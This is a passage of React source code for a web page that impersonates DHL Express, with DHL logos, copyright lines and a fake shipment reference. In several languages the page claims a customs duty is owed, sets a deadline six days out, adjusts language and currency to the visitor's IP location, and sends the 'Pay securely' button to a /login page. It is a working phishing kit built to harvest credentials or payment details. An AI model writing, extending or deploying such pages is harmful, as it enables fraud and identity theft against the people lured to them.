        inTransit: "Under transport",
        inDelivery: "För leverans",
        delivered: "Levererad",
        privacyNotice: "Integritetspolicy",
        consentSettings: "Cookie-inställningar",
        copyright: "DHL Group - Alla rättigheter förbehålls",
      },
    },
    {
      flag: "🇳🇴",
      name: "Norsk",
      code: "no",
      translations: {
        title: "Pakken din er nesten her",
        subtitle: "Ett siste trinn for å fortsette leveransen",
        reference: "Forsendelsesreferanse",
        greeting: "Hei,",
        message1:
          "Takk for tålmodigheten. Din forsendelse har blitt behandlet av destinasjonslandets toll den",
        message2:
          "I samsvar med internasjonale standarder har regjeringen vurdert en liten tollavgift. Dette er en rutinemessig avgift som pålegges importerte varer — dette er ikke et DHL-gebyr.",
        message3:
          "Når dette er løst, vil vi umiddelbart be om frigjøring av pakken din.",
        importDuty: "Tollavgift",
        processingFee: "Behandlingsgebyr",
        totalDue: "Totalt å betale",
        deadline: "Vennligst fullfør før",
        deadlineSuffix: "for å unngå retur til avsender.",
        payButton: "Betal trygt",
        secureNote:
          "🔒 Sikker betaling – En bekreftelses-e-post sendes etter betaling",
        customs: "Toll",
        actionRequired: "Handling kreves",
        orderPlaced: "Bestilling lagt inn",
        shipped: "Sendt",
        inTransit: "Under transport",
        inDelivery: "Til levering",
        delivered: "Levert",
        privacyNotice: "Personvernerklæring",
        consentSettings: "Samtykkeinnstillinger",
        copyright: "DHL Group - Alle rettigheter forbeholdt",
      },
    },
    {
      flag: "🇩🇰",
      name: "Dansk",
      code: "da",
      translations: {
        title: "Din pakke er næsten her",
        subtitle: "Et sidste trin for at fortsætte leveringen",
        reference: "Forsendelsesreference",
        greeting: "Hej,",
        message1:
          "Tak for din tålmodighed. Din forsendelse er blevet behandlet af destinationslandets told den",
        message2:
          "I overensstemmelse med internationale standarder har regeringen vurderet en lille toldafgift. Dette er en rutinemæssig afgift på importerede varer — dette er ikke et DHL-gebyr.",
        message3:
          "Når dette er løst, vil vi straks anmode om frigivelse af din pakke.",
        importDuty: "Importafgift",
        processingFee: "Behandlingsgebyr",
        totalDue: "Samlet beløb",
        deadline: "Venligst fuldfør før",
        deadlineSuffix: "for at undgå returnering til afsender.",
        payButton: "Betal sikkert",
        secureNote:
          "🔒 Sikker betaling – En bekræftelsesmail sendes efter betaling",
        customs: "Told",
        actionRequired: "Handling påkrævet",
        orderPlaced: "Bestilling afgivet",
        shipped: "Afsendt",
        inTransit: "Under transport",
        inDelivery: "Ude til levering",
        delivered: "Leveret",
        privacyNotice: "Privatlivspolitik",
        consentSettings: "Samtykkeindstillinger",
        copyright: "DHL Group - Alle rettigheder forbeholdes",
      },
    },
    {
      flag: "🇫🇮",
      name: "Suomi",
      code: "fi",
      translations: {
        title: "Pakettisi on melkein perillä",
        subtitle: "Viimeinen askel toimituksen jatkamiseksi",
        reference: "Lähetysviite",
        greeting: "Hei,",
        message1:
          "Kiitos kärsivällisyydestäsi. Lähetyksesi on käsitelty kohdemaan tullissa",
        message2:
          "Kansainvälisten standardien mukaisesti hallitus on arvioinut pienen tullimaksun. Tämä on rutiinimaksu tuontitavaroille — tämä ei ole DHL-maksu.",
        message3:
          "Kun tämä on ratkaistu, pyydämme välittömästi pakettisi vapauttamista.",
        importDuty: "Tuontitulli",
        processingFee: "Käsittelymaksu",
        totalDue: "Maksettava yhteensä",
        deadline: "Suorita ennen",
        deadlineSuffix: "välttääksesi palautuksen lähettäjälle.",
        payButton: "Maksa turvallisesti",
        secureNote:
          "🔒 Turvallinen maksu – Vahvistussähköposti lähetetään maksun jälkeen",
        customs: "Tulli",
        actionRequired: "Toiminta vaaditaan",
        orderPlaced: "Tilaus tehty",
        shipped: "Lähetetty",
        inTransit: "Kuljetuksessa",
        inDelivery: "Toimituksessa",
        delivered: "Toimitettu",
        privacyNotice: "Tietosuojailmoitus",
        consentSettings: "Suostumusasetukset",
        copyright: "DHL Group - Kaikki oikeudet pidätetään",
      },
    },
  ];

  // ============================================
  // COUNTRY TO LANGUAGE MAPPING - FIXED PER REQUEST
  // TN = "en", CH = "de"
  // ============================================
  const countryToLanguage = {
    // French speaking countries
    FR: "fr", BE: "fr", LU: "fr", MC: "fr", SN: "fr", CI: "fr", CM: "fr",
    // English speaking countries (TN = en)
    US: "en", GB: "en", CA: "en", AU: "en", NZ: "en", IN: "en", ZA: "en",
    NG: "en", SG: "en", PH: "en", MY: "en", TN: "en",  // TN = en
    // Arabic speaking countries
    SA: "ar", AE: "ar", QA: "ar", KW: "ar", BH: "ar", OM: "ar", JO: "ar",
    EG: "ar", LB: "ar", IQ: "ar", YE: "ar", PS: "ar", LY: "ar", SD: "ar",
    MR: "ar", SO: "ar", MA: "ar", DZ: "ar",
    // Spanish speaking countries
    ES: "es", MX: "es", AR: "es", CO: "es", PE: "es", VE: "es", CL: "es",
    EC: "es", GT: "es", CU: "es", BO: "es", DO: "es", HN: "es", PY: "es",
    SV: "es", NI: "es", CR: "es", PA: "es", UY: "es",
    // German speaking countries (CH = de)
    DE: "de", AT: "de", LI: "de", CH: "de",  // CH = de
    // Italian
    IT: "it", SM: "it", VA: "it",
    // Portuguese
    PT: "pt", BR: "pt", AO: "pt", MZ: "pt", CV: "pt", GW: "pt", TL: "pt",
    // Dutch
    NL: "nl",
    // Polish
    PL: "pl",
    // Russian
    RU: "ru", BY: "ru", KZ: "ru", KG: "ru", UA: "ru",
    // Chinese
    CN: "zh", TW: "zh", HK: "zh", MO: "zh",
    // Japanese
    JP: "ja",
    // Korean
    KR: "ko",
    // Turkish
    TR: "tr",
    // Vietnamese
    VN: "vi",
    // Thai
    TH: "th",
    // Indonesian
    ID: "id",
    // Nordic
    SE: "sv", NO: "no", DK: "da", FI: "fi",
    // Other
    IL: "he", PK: "ur", BD: "bn", LK: "si",
  };

  // Fetch IP info on component mount
  useEffect(() => {
    const fetchIpInfo = async () => {
      try {
        const response = await fetch(`${apiUrl}/api/ipinfo`);
        const data = await response.json();

        if (data.success && data.country_code) {
          setIpCountry(data.country_code);

          // Auto-select language based on country
          const detectedLangCode = countryToLanguage[data.country_code] || "en";
          const detectedLang = languages.find(
            (lang) => lang.code === detectedLangCode,
          );
          if (detectedLang) {
            setSelectedLang(detectedLang);
            console.log(
              `🌍 IP detected: ${data.country} → Language set to: ${detectedLang.name}`,
            );
          }

          // Auto-select currency based on country
          const detectedCurrency =
            currencyConfig[data.country_code] || currencyConfig["default"];
          setCurrency(detectedCurrency);
          console.log(
            `💰 Currency set to: ${detectedCurrency.code} (${detectedCurrency.symbol})`,
          );
        }
      } catch (error) {
        console.error("Failed to fetch IP info:", error);
        // Fallback to default currency if IP detection fails
        setCurrency(currencyConfig["default"]);
      } finally {
        setIsLoadingLang(false);
      }
    };
    fetchIpInfo();
  }, []);

  const handleLangSelect = (lang) => {
    setSelectedLang(lang);
    setLangMenuOpen(false);
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    console.log(
      `Payment initiated: ${currency.symbol}${currency.totalDue} ${currency.code}`,
    );
  };

  const handleConsentClick = (e) => {
    e.preventDefault();
    console.log("Consent settings opened");
  };

  const handlePrivacyClick = (e) => {
    e.preventDefault();
    console.log("Privacy notice clicked");
  };

  const t = selectedLang.translations;

  const getCustomsDate = () => {
    const date = new Date();
    date.setDate(date.getDate() - 1);
    const localeMap = {
      fr: "fr-FR", de: "de-DE", es: "es-ES", ar: "ar-EG",
      zh: "zh-CN", ja: "ja-JP", ko: "ko-KR", ru: "ru-RU",
      it: "it-IT", pt: "pt-PT", tr: "tr-TR", nl: "nl-NL",
      pl: "pl-PL", sv: "sv-SE", no: "nb-NO", da: "da-DK",
      fi: "fi-FI",
    };
    const locale = localeMap[selectedLang.code] || "en-US";
    return date.toLocaleDateString(locale, { year: "numeric", month: "long", day: "numeric" });
  };

  const getDeadlineDate = () => {
    const date = new Date();
    date.setDate(date.getDate() + 6);
    const localeMap = {
      fr: "fr-FR", de: "de-DE", es: "es-ES", ar: "ar-EG",
      zh: "zh-CN", ja: "ja-JP", ko: "ko-KR", ru: "ru-RU",
      it: "it-IT", pt: "pt-PT", tr: "tr-TR", nl: "nl-NL",
      pl: "pl-PL", sv: "sv-SE", no: "nb-NO", da: "da-DK",
      fi: "fi-FI",
    };
    const locale = localeMap[selectedLang.code] || "en-US";
    return date.toLocaleDateString(locale, { year: "numeric", month: "long", day: "numeric" });
  };

  if (isLoadingLang) {
    return <LoadingPage />;
  }

  // Format currency amount based on currency code
  const formatCurrency = (amount) => {
    if (
      currency.symbol === "TND" ||
      currency.symbol === "CHF" ||
      currency.symbol === "PLN"
    ) {
      return `${currency.symbol} ${amount.toFixed(2)}`;
    } else if (
      currency.code === "JPY" ||
      currency.code === "KRW" ||
      currency.code === "IDR" ||
      currency.code === "VND" ||
      currency.code === "HUF" ||
      currency.code === "CZK"
    ) {
      return `${currency.symbol}${Math.round(amount)}`;
    } else {
      return `${currency.symbol}${amount.toFixed(2)}`;
    }
  };

  return (
    <div dir="ltr" className="app-container">
      <main className="app-main">
        {/* Header / Top Bar */}
        <div dir="ltr" className="top-bar">
          <div className="header-container">
            <div className="header-content">
              <div className="logo-container">
                <div className="logo-wrapper">
                  <img
                    alt="DHL Logo"
                    className="dhl-logo"
                    src="dhl-express-logo.png"
                  />
                </div>
              </div>
              <div className="right-section">
                <div className="lang-container">
                  <div className="portal-lang-dropdown">
                    <button
                      className="portal-lang-btn"
                      id="langBtn"
                      onClick={() => setLangMenuOpen(!langMenuOpen)}
                    >
                      <span id="langFlag">{selectedLang.flag}</span>
                      <span id="langName">{selectedLang.name}</span>
                      <svg
                        width="12"
                        height="12"
                        viewBox="0 0 12 12"
                        fill="none"
                        style={{ marginLeft: "4px" }}
                      >
                        <path
                          d="M3 5L6 8L9 5"
                          stroke="currentColor"
                          strokeWidth="1.5"
                          strokeLinecap="round"
                        ></path>
                      </svg>
                    </button>
                    {langMenuOpen && (
                      <div className="portal-lang-menu" id="langMenu">
                        {languages.map((lang) => (
                          <a
                            key={lang.code}
                            href="#"
                            onClick={(e) => {
                              e.preventDefault();
                              handleLangSelect(lang);
                            }}
                            style={{
                              display: "block",
                              padding: "8px 12px",
                              textDecoration: "none",
                              color: "#333",
                            }}
                          >
                            {lang.flag} {lang.name}
                          </a>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="main-content-container">
          <div dir="ltr" className="content-wrapper">
            <div className="live-region" aria-live="assertive"></div>
            <div
              className="main-card"
              style={{ direction: "ltr", textAlign: "left" }}
            >
              <div
                className="card-inner"
                style={{ direction: "ltr", textAlign: "left" }}
              >
                {/* Timeline Section */}
                <div className="timeline-section">
                  <div className="timeline">
                    <div className="tl-step done">
                      <div className="tl-icon">✓</div>
                      <div className="tl-label">{t.orderPlaced}</div>
                      <div className="tl-date"></div>
                    </div>
                    <div className="tl-line done"></div>
                    <div className="tl-step done">
                      <div className="tl-icon">✓</div>
                      <div className="tl-label">{t.shipped}</div>
                      <div className="tl-date"></div>
                    </div>
                    <div className="tl-line done"></div>
                    <div className="tl-step done">
                      <div className="tl-icon">✓</div>
                      <div className="tl-label">{t.inTransit}</div>
                      <div className="tl-date"></div>
                    </div>
                    <div className="tl-line active"></div>
                    <div className="tl-step current">
                      <div className="tl-icon">
                        <span className="tl-pulse"></span>
                      </div>
                      <div className="tl-label">{t.customs}</div>
                      <div className="tl-date">{t.actionRequired}</div>
                    </div>
                    <div className="tl-line pending"></div>
                    <div className="tl-step pending">
                      <div className="tl-icon"></div>
                      <div className="tl-label">{t.inDelivery}</div>
                      <div className="tl-date"></div>
                    </div>
                    <div className="tl-line pending"></div>
                    <div className="tl-step pending">
                      <div className="tl-icon"></div>
                      <div className="tl-label">{t.delivered}</div>
                      <div className="tl-date"></div>
                    </div>
                  </div>
                </div>

                {/* Landing Header */}
                <div className="landing-header">
                  <h2>{t.title}</h2>
                  <p className="landing-sub">{t.subtitle}</p>
                  <div className="landing-ref-box">
                    <span className="landing-ref-label">{t.reference}</span>
                    <span className="landing-ref-value">DHL-740-908-7078</span>
                  </div>
                </div>

                {/* Landing Body */}
                <div className="landing-body">
                  <p>{t.greeting}</p>
                  <p>
                    {t.message1}{" "}
                    <span id="customs-date">{getCustomsDate()}</span>.
                  </p>
                  <p>{t.message2}</p>
                  <p>{t.message3}</p>
                </div>

                {/* Payment Section with Dynamic Currency */}
                <div className="landing-payment">
                  <div className="landing-payment-box">
                    <div className="landing-fee-row">
                      <span>{t.importDuty}</span>
                      <span>{formatCurrency(currency.importDuty)}</span>
                    </div>
                    <div className="landing-fee-row">
                      <span>{t.processingFee}</span>
                      <span>{formatCurrency(currency.processingFee)}</span>
                    </div>
                    <div className="landing-fee-divider"></div>
                    <div className="landing-fee-total">
                      <span>{t.totalDue}</span>
                      <span>{formatCurrency(currency.totalDue)}</span>
                    </div>
                    <div className="landing-deadline">
                      {t.deadline}{" "}
                      <strong id="deadline-date">{getDeadlineDate()}</strong>{" "}
                      {t.deadlineSuffix}
                    </div>
                  </div>
                  <a href="/login" className="landing-pay-btn">
                    {t.payButton}
                  </a>
                  <div className="landing-secure-note">{t.secureNote}</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="footer-container">
          <div className="footer-inner">
            <table className="footer-table">
              <tbody>
                <tr className="footer-body-row">
                  <td className="footer-cell-main">
                    <a
                      href="#"
                      className="footer-link"
                      onClick={handlePrivacyClick}
                    >
                      <strong>{t.privacyNotice}</strong>
                    </a>
                    <div className="footer-links-group">
                      <a
                        className="footer-link consent-link"
                        href="#"
                        onClick={handleConsentClick}
                      >
                        {t.consentSettings}
                      </a>
                    </div>
                  </td>
                  <td className="footer-cell-logo">
                    <img
                      alt="DHL Logo"
                      loading="lazy"
                      width="160"
                      height="52"
                      decoding="async"
                      className="footer-logo"
                      src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0ibG9nbyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTk2IDUxLjgzNjciIHdpZHRoPSIxNjAiIGhlaWdodD0iNTIiPgogIDxnPgogICAgPGc+CiAgICAgIDxnPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyMi4xIDI2LjUwNTggMjIuMSAyNS4wNTgxIDI0LjA3MDMgMCAyNC4wNzAzIDAgMjIuMSAwIDIyLjEiLz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjAgMTguNDQ0NCAyOS4xOTg2IDE4LjQ0NDQgMjcuNzQ4MyAyMC40MTIgMCAyMC40MTIgMCAxOC40NDQ0IDAgMTguNDQ0NCIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyNS43NTg0IDIzLjgxNDYgMjUuNzU4NCAyMi4zNzMzIDI3LjcxNTIgMCAyNy43MTUyIDAgMjUuNzU4NCAwIDI1Ljc1ODQiLz4KICAgICAgPC9nPgogICAgICA8Zz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE5NiAyNC4wNzAzIDE2OS41OTc2IDI0LjA3MDMgMTcxLjA0NDYgMjIuMTAxNCAxOTYgMjIuMTAxNCAxOTYgMjQuMDcwMyAxOTYgMjQuMDcwMyIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTk2IDI3LjcxNTIgMTY2LjkxMjggMjcuNzE3OSAxNjguMzUzNyAyNS43NTg0IDE5NiAyNS43NTg0IDE5NiAyNy43MTUyIDE5NiAyNy43MTUyIi8+CiAgICAgICAgPHBvbHlnb24gcG9pbnRzPSIxNzMuNzM1NCAxOC40NDQ0IDE5NiAxOC40NDQ0IDE5NiAyMC40MTMzIDE3Mi4yODcgMjAuNDE0NyAxNzMuNzM1NCAxOC40NDQ0IDE3My43MzU0IDE4LjQ0NDQiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Im0yNS42NzI2LDI3LjcxNTJsMTIuNTc4LTE3LjA4ODVoMTUuNjA4MmMxLjcyNTIsMCwxLjcwMjYuNjU1Ljg1OTUsMS43OTc1LS44NTYyLDEuMTYtMi4zMTM0LDMuMTU0Ni0zLjE4NTQsNC4zMzIyLS40NDI2LjU5ODItMS4yNDMxLDEuNjg4MSwxLjQwODksMS42ODgxaDIwLjkxMDFjLTEuNzM5LDIuMzgyMi03LjM3OTYsOS4yNzA4LTE3LjUwODMsOS4yNzA4aC0zMC42NzFaIi8+CiAgICAgIDxwYXRoIGQ9Im05Ny43MDU2LDE4LjQ0M2wtNi44MjAyLDkuMjcyMmgtMTcuOTkyNHM2LjgxNzItOS4yNzA4LDYuODIzMy05LjI3MDhsMTcuOTg5My0uMDAxNGgwWiIvPgogICAgICA8cGF0aCBkPSJtMTIzLjcyMzksMTguNDQ0NGwtNi44MjM5LDkuMjcwOGgtMTcuOTg1NnM2LjgxNzgtOS4yNzA4LDYuODIzOS05LjI3MDhoMTcuOTg1NloiLz4KICAgICAgPHBhdGggZD0ibTEyOS41NzQ5LDE4LjQ0NDRjLjAwMDYsMC0xLjMxNCwxLjc5NzQtMS45NTI4LDIuNjYwNC0yLjI1OTMsMy4wNTMzLS4yNjI2LDYuNjEwNCw3LjExMDksNi42MTA0aDI4Ljg4NTNsNi44MjI2LTkuMjcwOGgtNDAuODY2MVoiLz4KICAgIDwvZz4KICAgIDxnPgogICAgICA8cGF0aCBkPSJtMzQuNDY4NSwwbC02LjI2MjEsOC41MDc4aDM0LjEyODhjMS43MjQ5LDAsMS43MDIzLjY1NS44NTkzLDEuNzk3NC0uODU2MiwxLjE1ODctMi4yODk0LDMuMTc2My0zLjE2MTQsNC4zNTM4LS40NDI3LjU5NjktMS4yNDMxLDEuNjg2NywxLjQwODksMS42ODY3aDEzLjk1NjRzMi4yNDk1LTMuMDYxNCw0LjEzNTItNS42MjA1YzIuNTY1NS0zLjQ4MTQuMjIyNS0xMC43MjUyLTguOTQ4Ni0xMC43MjUyaC0zNi4xMTY1WiIvPgogICAgICA8cG9seWdvbiBwb2ludHM9IjEyNS4yNjg4IDE2LjM0NTggODEuMjYxOSAxNi4zNDU4IDkzLjI5NTYgMCAxMTEuMjgxOSAwIDEwNC4zODU4IDkuMzcyMSAxMTIuNDEzNiA5LjM3MjEgMTE5LjMxNTMgMCAxMzcuMjk4OSAwIDEyNS4yNjg4IDE2LjM0NTggMTI1LjI2ODggMTYuMzQ1OCIvPgogICAgICA8cGF0aCBkPSJtMTYyLjIwODQsMGwtMTIuMDMxNCwxNi4zNDU4aC0xOS4wNTkzUzE0My4xNTMyLDAsMTQzLjE1OTIsMGgxOS4wNDkyWiIvPgogICAgPC9nPgogIDwvZz4KICA8Zz4KICAgIDxwYXRoIGQ9Im0xMjguODQxMiw0OC4zOTQzYy0xLjc5NjgsMC0zLjE5MzktLjU1MDctNC4xOTA1LTEuNjUyM3MtMS40OTUtMi42Mjk0LTEuNDk1LTQuNTgzNXYtMS4xNDEyYzAtMS4yOTgxLjI0MzEtMi40MDk2LjcyNzktMy4zMzQzLjQ4NTUtLjkyNDQsMS4xNjc1LTEuNjMyNywyLjA0Ni0yLjEyNDMuODc4NS0uNDkxOSwxLjkwODItLjczNzcsMy4wODg1LS43Mzc3Ljk0NCwwLDEuNzkwMS4xNjA3LDIuNTM3NS40ODE4Ljc0NzUuMzIxOCwxLjM5NzEuNzkwNCwxLjk0NzQsMS40MDY1bC0xLjczMDYsMS44Mjk2Yy0uNDMyOC0uNDMyOC0uODcyNC0uNzM0My0xLjMxODEtLjkwNDgtLjQ0NjMtLjE3MDUtLjkxMTYtLjI1NTktMS4zOTcxLS4yNTU5LS45NDQsMC0xLjY2OTIuMzE4NC0yLjE3MzYuOTU0MS0uNTA1MS42MzY0LS43NTc2LDEuNTcwNi0uNzU3NiwyLjgwMzN2LjkwNDhjMCwxLjIzMy4yMzMsMi4xNzM5LjY5ODksMi44MjI4LjQ2NTIuNjQ5MiwxLjE0MzkuOTczNywyLjAzNTguOTczNy44MTMsMCwxLjQzODktLjI2ODQsMS44Nzg1LS44MDYycy42NTktMS4yMzI2LjY1OS0yLjA4NTVoLTIuNTk3di0yLjM5OThoNS40ODl2Mi4yODJjMCwxLjE2NzUtLjIyMzUsMi4xNjcyLS42NjkyLDIuOTk5Ny0uNDQ1Ny44MzMyLTEuMDc1NywxLjQ2OS0xLjg4ODYsMS45MDgycy0xLjc3NzIuNjU5LTIuODkxNC42NTlaIi8+CiAgICA8cGF0aCBkPSJtMTM2LjQ3MzUsNDguMDk5M3YtMTAuMDMyNGgyLjY5NDl2Mi40OThjLjE0MzgtLjQ0NTcuMzM3Ni0uODY4Ny41OC0xLjI2ODguMjQzMS0uMzk5Ny41NTc3LS43Mjc5Ljk0NDctLjk4MzUuMzg2Mi0uMjU1OS44Njg0LS4zODM1LDEuNDQ1Ny0uMzgzNS4xMTgyLDAsLjIyNjIuMDAzNC4zMjQ4LjAwOTguMDk3OS4wMDY4LjIxOTUuMDIzLjM2NC4wNDl2Mi42MzYxYy0uMTA1My0uMDEyOC0uMjIwMS0uMDIyNi0uMzQ0NC0uMDI5NC0uMTI0OS0uMDA2NC0uMjQ1OC0uMDA5OC0uMzY0LS4wMDk4LS43MjEyLDAtMS4zMTEzLjEzNzQtMS43NzA1LjQxMjlzLS44MDAyLjU3MDYtMS4wMjMuODg1MnY2LjIxNjJoLTIuODUyMloiLz4KICAgIDxwYXRoIGQ9Im0xNDguNjUsNDguMzM1M2MtMS40OTUsMC0yLjY3MjYtLjQzMjgtMy41MzA4LTEuMjk4MS0uODU5Ni0uODY1Ny0xLjI4OS0yLjA1MjQtMS4yODktMy41NjA1di0uNzg3YzAtMS41MDc4LjQyOTUtMi42OTQ5LDEuMjg5LTMuNTYwNS44NTgyLS44NjU3LDIuMDM1OC0xLjI5ODUsMy41MzA4LTEuMjk4NXMyLjY3MTkuNDMyOCwzLjUzMDgsMS4yOTg1LDEuMjg5LDIuMDUyNywxLjI4OSwzLjU2MDV2Ljc4N2MwLDEuNTA4MS0uNDMwMSwyLjY5NDktMS4yODksMy41NjA1LS44NTg5Ljg2NTMtMi4wMzU4LDEuMjk4MS0zLjUzMDgsMS4yOTgxWm0wLTIuMzgwMmMuNjE2NSwwLDEuMDk3OS0uMjA5NywxLjQ0NTctLjYyOTNzLjUyMTMtMS4wNTU3LjUyMTMtMS45MDgydi0uNjY4OGMwLS44NTI1LS4xNzM1LTEuNDg4Mi0uNTIxMy0xLjkwODItLjM0NzctLjQxOTctLjgyOTItLjYyOTctMS40NDU3LS42Mjk3cy0xLjA5ODYuMjEtMS40NDU3LjYyOTdjLS4zNDc3LjQyLS41MjEzLDEuMDU1Ny0uNTIxMywxLjkwODJ2LjY2ODhjMCwuODUyNS4xNzM1LDEuNDg4Ni41MjEzLDEuOTA4Mi4zNDcxLjQxOTcuODI5Mi42MjkzLDEuNDQ1Ny42MjkzWiIvPgogICAgPHBhdGggZD0ibTE1OC41MDU4LDQ4LjI5NjFjLS45ODM4LDAtMS43MzgxLS4zNDc0LTIuMjYyNy0xLjA0MjZzLS43ODY3LTEuNjc4Ni0uNzg2Ny0yLjk1MDh2LTYuMjM1OGgyLjg1MjJ2Ni4wNTg2YzAsLjUzODIuMTE0OC45NjM5LjM0NDQsMS4yNzg5LjIyOTYuMzE0Ny41OTM1LjQ3MiwxLjA5MTkuNDcyLjM2NjcsMCwuNjg4Ny0uMDg4NS45NjM2LS4yNjU3LjI3NTUtLjE3NjkuNDk4My0uNDAzMS42NjkyLS42Nzg2di02Ljg2NTJoMi44NTIydjEwLjAzMjRoLTIuNjk0OXYtMS43NTA5Yy0uMzAxOC41NzczLS43MDQ5LDEuMDQ1OS0xLjIxLDEuNDA2NXMtMS4xMTE0LjU0MTItMS44MTkxLjU0MTJaIi8+CiAgICA8cGF0aCBkPSJtMTY2LjgyNjEsNTEuODM2N3YtMTMuNzY5OGgyLjY5NDl2MS43MzFjLjI3NTUtLjYwMy42NzE5LTEuMDc1MywxLjE4OTgtMS40MTYzLjUxODYtLjM0MSwxLjExMTQtLjUxMTUsMS43ODA2LS41MTE1LDEuMTI3NiwwLDIuMDA5NS40Mjk4LDIuNjQ1NiwxLjI4ODQuNjM2MS44NTkyLjk1NDEsMi4wMzYyLjk1NDEsMy41MzEydi43ODdjMCwxLjQ5NS0uMzE4LDIuNjcyMy0uOTU0MSwzLjUzMDgtLjYzNjEuODU5Mi0xLjUxNzksMS4yODg3LTIuNjQ1NiwxLjI4ODctMS4yOTg1LDAtMi4yMzY0LS42MDMzLTIuODEzLTEuODF2NS4zNTA2aC0yLjg1MjJabTQuNTgzNS0xMS41NjY4Yy0uNzIxOCwwLTEuMjk4NS4zMDgyLTEuNzMxMy45MjQ3djMuNzk2NWMuNDMyOC42MDMzLDEuMDA5NS45MDQ4LDEuNzMxMy45MDQ4LjU5MDIsMCwxLjA0MjYtLjIxMywxLjM1NzItLjYzOTFzLjQ3Mi0xLjAzOTIuNDcyLTEuODM5NHYtLjY2ODhjMC0uNzk5OC0uMTU3My0xLjQxMjktLjQ3Mi0xLjgzOTQtLjMxNDctLjQyNjEtLjc2NzEtLjYzOTUtMS4zNTcyLS42Mzk1WiIvPgogIDwvZz4KPC9zdmc+"
                      style={{
                        color: "transparent",
                        width: "128px",
                        height: "auto",
                      }}
                    />
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          <div className="copyright">{t.copyright}</div>
        </div>
      </main>

      <style>{`
        /* Reset and Base Styles */
        * {
          box-sizing: border-box;
        }

        :root {
          --color-brand-primary: #d40511;
          --color-brand-green: #007C39;
          --color-brand-secondary: #ffcc00;
          --color-brand-background-base: #F7F7F7;
          --color-brand-gradient: linear-gradient(90deg, var(--color-brand-secondary) 30%, rgba(255,204,0,0.3) 88%);
          --color-brand-blue: #007acc;
          --color-brand-light-blue: #f2f8fc;
          --color-brand-dark-blue: #005c99;
          --color-brand-light-grey: #cccccc;
          --color-dark-grey: #444444;
          --color-brand-green-hover: #1F891F;
          --color-brand-primary-accesibility: #80050c;
          --color-card-brand-yellow: #ffcc00;
          --color-common-black: #000000;
          --color-error-bg: #fdf3f3;
          --color-text-headline: #333333;
          --color-text-body-1: #333333;
          --color-text-body-2: #666666;
          --color-text-blue: #007acc;
          --color-text-darkgrey: #444444;
          --color-text-mediumgrey: #555555;
          --color-text-black: #000000;
          --color-status-success: #007c39;
          --color-status-error: #d40511;
          --color-status-disabled-bg: #f2f2f2;
          --color-tag-grey-bg: #767676;
          --font-family-base: Arial, sans-serif;
          --font-size-h1-lg: 50px;
          --font-size-h1: 36px;
          --font-size-h1-sm: 28px;
          --font-size-h1-xs: 21px;
          --font-size-h2-lg: 35px;
          --font-size-h2: 20px;
          --font-size-h3: 20px;
          --font-size-h4: 16px;
          --font-size-h5: 16px;
          --font-size-body-lg: 20px;
          --font-size-body-nl: 18px;
          --font-size-body: 16px;
          --font-size-body-sm: 14px;
          --font-size-body-xs: 12px;
          --color-layout-header-bg: var(--color-brand-gradient);
          --color-layout-footer-bg: #fff;
          --color-layout-footer-text: #4f4f4f;
          --color-form-input-border: #888888;
          --color-form-input: #000000;
          --color-form-label: #222222;
          --color-form-label-focus: #666666;
          --font-size-form-otp: 24px;
          --border-radius-form-input: 3px;
          --color-button-disabled: #fff;
          --color-button-disabled-bg: #d1d1d1;
          --color-button-border-black: #000000;
          --background-color-button-disable: #e5e5e5;
          --background-color-button-enable: #ffffff;
          --info-container-border-color: #ccc;
          --subscription-button-color: #333333;
          --circle-bg: #888888;
          --circle-bg-color: #ffcc00;
          --menu-link-color: #d40511;
          --footer-title-color: #777777;
          --help-support-register: #333333;
          --dui-size-space-1x: 4px;
          --dui-size-space-2x: 8px;
          --dui-size-space-3x: 12px;
          --dui-size-space-4x: 16px;
          --dui-size-space-5x: 20px;
          --dui-size-space-6x: 24px;
          --dui-size-space-7x: 28px;
          --dui-size-space-8x: 32px;
          --dui-size-space-9x: 36px;
          --dui-size-space-10x: 40px;
          --dui-size-space-20x: 80px;
          --dui-size-radius-md: 8px;
          --dui-colors-background-base: #ffffff;
          --dui-colors-background-secondary: #f5f5f5;
          --dui-colors-stroke-functional-focus: #005c99;
          --dui-colors-action-background-primary-default: #d40511;
          --dui-colors-action-background-primary-hover: #b00410;
          --dui-colors-action-foreground-secondary-default: #666666;
          --dui-shadow-md-0: 0 1px 3px rgba(0,0,0,0.12);
          --dui-shadow-md-1: 0 2px 6px rgba(0,0,0,0.08);
          --dui-shadow-md-2: 0 4px 12px rgba(0,0,0,0.05);
          font-size: var(--font-size-body);
          color: var(--color-text-body-1);
          font-family: var(--font-family-base);
          background-color: var(--color-brand-background-base);
        }

        .app-container {
          min-height: 100vh;
          background-color: var(--color-brand-background-base);
        }

        /* Header Styles */
        .top-bar {
          position: fixed;
          z-index: 1001;
          margin-top: 0;
          transition: margin-top 0.4s linear;
          width: 100%;
          color: rgb(0,0,0);
        }

        .header-container {
          height: auto;
          background-color: var(--color-brand-secondary);
        }

        .header-content {
          display: flex;
          min-height: 60px;
          height: 100%;
          flex-wrap: wrap;
          align-items: center;
          box-sizing: border-box;
          max-width: 1190px;
          padding: 0px 40px;
          margin: 0px auto;
          width: 100%;
        }

        .logo-container {
          flex-grow: 1;
          padding: 15px 0px;
          margin-right: auto;
        }

        .dhl-logo {
          width: auto;
          height: auto;
        }

        .right-section {
          flex-grow: 1;
          margin-left: auto;
        }

        .lang-container {
          display: flex;
          align-items: center;
          justify-content: flex-end;
          gap: 28px;
          font-size: var(--font-size-body-xs);
        }

        .ip-indicator {
          font-size: 14px;
          opacity: 0.7;
          cursor: help;
        }

        .portal-lang-dropdown {
          position: relative;
          display: inline-block;
        }

